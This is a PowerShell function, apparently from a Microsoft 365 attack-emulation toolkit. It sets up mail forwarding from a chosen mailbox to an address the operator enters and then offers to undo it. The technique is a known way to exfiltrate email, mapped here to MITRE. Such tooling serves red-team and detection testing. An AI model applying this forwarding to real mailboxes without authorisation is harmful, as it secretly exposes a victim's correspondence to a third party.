function MailForwarding {	
    mitre_details("MailForwarding")

    #Get target mailbox
    EnterMailbox("`n[?] Enter mailbox address to setup mail forwarding from")

    $target_mailbox = $global:mailbox_address

    MAADWriteProcess "Fetching current forwarding configuration of mailbox"
    $mailbox_config = Get-Mailbox -Identity $target_mailbox
    #$mailbox_config | Format-Table @{Label="Name";Expression={$_.DisplayName}}, @{Label="Forwarding Address";Expression={$_.ForwardingSMTPAddress}}, AuditEnabled
    if ($mailbox_config.ForwardingSMTPAddress -eq $null){
        MAADWriteProcess "Current Forwarding Address : None"
    }
    else{
        MAADWriteProcess "Current Forwarding Address : $($mailbox_config.ForwardingSMTPAddress)"
    }
    MAADWriteProcess "Current Audit Enabled : $($mailbox_config.AuditEnabled)"

    #Enter destination mailbox address
    $recipient_mailbox = Read-Host -Prompt "`n[?] Enter email address to forward mailbox to"
    Write-Host ""

    #Setup mailbox forwarding
    try {
        MAADWriteProcess "Deploying mail forwarding"
        MAADWriteProcess "Forwarding Config: Source($target_mailbox) -> Recipient($recipient_mailbox)"
        Set-Mailbox -Identity $target_mailbox -DeliverToMailboxAndForward $true -ForwardingSMTPAddress $recipient_mailbox -ErrorAction Stop | Out-Null
        MAADWriteProcess "Deployed mail forwarding"
        MAADWriteProcess "Fetching updated forwarding configuration of mailbox"
        Start-Sleep -s 30
        $mailbox_config_updated = Get-Mailbox -Identity $target_mailbox
        #Get-Mailbox -Identity $target_mailbox | Format-Table @{Label="Name";Expression={$_.DisplayName}}, @{Label="Forwarding Address";Expression={$_.ForwardingSMTPAddress}}, AuditEnabled
        MAADWriteProcess "Updated Forwarding Address : $($mailbox_config_updated.ForwardingSMTPAddress)"
        MAADWriteSuccess "Deployed Mail Forwarding"
        $allow_undo = $true
    }
    catch {
        MAADWriteError "Failed to deploy mail forwarding"
    }
    
    #Undo changes
    if ($allow_undo -eq $true) {
        $user_confirm = Read-Host -Prompt "`n[?] Undo: Remove mail forwarding config from mailbox (y/n)"
        Write-Host ""
        if ($user_confirm -notin "No","no","N","n") {
            try {   
                MAADWriteProcess "Removing mail forwarding from mailbox -> $target_mailbox"
                Set-Mailbox -Identity $target_mailbox -ForwardingSMTPAddress $null
                MAADWriteProcess "Fetching updated forwarding configuration of mailbox"
                Start-Sleep -s 30
                $mailbox_config_updated = Get-Mailbox -Identity $target_mailbox
                if ($mailbox_config_updated.ForwardingSMTPAddress -eq $null){
                    MAADWriteProcess "Updated Forwarding Address : None"
                }
                MAADWriteProcess "Updated Forwarding Address : $($mailbox_config_updated.ForwardingSMTPAddress)"
                #Get-Mailbox -Identity $target_mailbox | Format-Table @{Label="Name";Expression={$_.DisplayName}}, @{Label="Forwarding Address";Expression={$_.ForwardingSMTPAddress}}, AuditEnabled
                MAADWriteSuccess "Removed mail forwarding configuration"
            }
            catch {
                MAADWriteError "Failed to remove mail forwarding configuration"
            }
        }
    }
    MAADPause    
}